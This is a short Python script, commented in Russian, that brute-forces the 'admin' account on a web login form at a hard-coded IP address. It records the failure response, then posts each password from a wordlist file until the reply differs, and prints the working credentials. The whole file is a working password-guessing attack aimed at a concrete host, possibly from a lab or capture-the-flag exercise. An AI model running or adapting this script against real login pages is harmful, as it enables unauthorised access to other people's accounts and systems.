import requests #Импортирование библиотеки для запросов на сайт
password = '123343234'

payload = {"name":"admin", 'pass': password}
url = requests.post(f'http://194.67.206.180:8033/index.php', data=payload) # Отправляем POST-запрос на сайт

error = url.text


file1 = open('emmitt.txt','r') #Открываем файл на чтение

while True:
    line = file1.readline() #Считываем строку
    ########## ПРОВЕРКА НА КОНЕЦ ФАЙЛА ##########
    if not line:
        break
    #############################################

    str_read = line.strip()
    payload = {"name": "admin", 'pass': str_read}
    url = requests.post(f'http://194.67.206.180:8033/index.php', data=payload)  # Отправляем POST-запрос на сайт
    if error == url.text:
        print("." + ".")
    else:
        print(url.text,"\n")
        print(payload)
        break
